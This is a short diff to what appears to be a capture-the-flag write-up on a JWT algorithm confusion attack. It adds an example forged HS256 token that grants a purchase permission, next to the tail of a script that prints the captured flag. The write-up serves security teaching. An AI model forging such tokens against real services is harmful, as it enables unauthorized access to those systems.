@@ -243,6 +243,8 @@ for line in response.iter_lines(decode_unicode=True):
         print(f'Flag:{line}')
 ```
 
+Example of the forged token (HS256): `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwdXJjaGFzZVBlcm0iOnRydWV9.1YZ0CGvtXB1ukrQiIFLr03bs3mgKuxquiebt3Bk5Axo`
+
 After executing the script we are able to obtain the flag which indicates that the JWT Algorithm Confusion attack has been successfully demonstrated. 
 
 <br>
